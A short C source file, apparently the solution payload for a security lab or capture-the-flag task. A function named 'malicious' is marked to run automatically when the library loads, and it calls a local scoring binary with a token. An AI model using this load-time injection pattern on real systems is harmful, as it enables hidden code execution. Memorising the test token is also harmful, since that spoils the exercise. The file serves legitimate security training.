#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 589e4a30-98a3-4f21-885f-7ad0f172a1b2");
}